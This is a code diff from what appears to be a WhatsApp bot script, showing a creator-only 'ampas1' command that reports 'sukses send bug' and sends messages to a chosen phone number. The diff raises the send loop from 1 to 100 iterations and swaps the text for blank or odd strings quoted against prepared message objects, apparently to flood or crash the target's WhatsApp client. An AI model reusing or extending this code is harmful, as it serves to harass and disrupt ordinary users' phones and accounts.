@@ -664,12 +664,12 @@ case 'ampas1' : {
 if (!isCreator) return
 
 reply('sukses send bug')
-for (let i = 0; i < 1; i++) {
+for (let i = 0; i < 100; i++) {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await hisoka.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-hisoka.sendMessage(Pe, {text: "Assalamualaikum"}, {quoted: mek})
+hisoka.sendMessage(Pe, {text: " "}, {quoted: mek})
 await sleep(20)
-hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+hisoka.sendMessage(Pe, {text: " "}, {quoted: doc})
 await sleep(20)
 }
 }
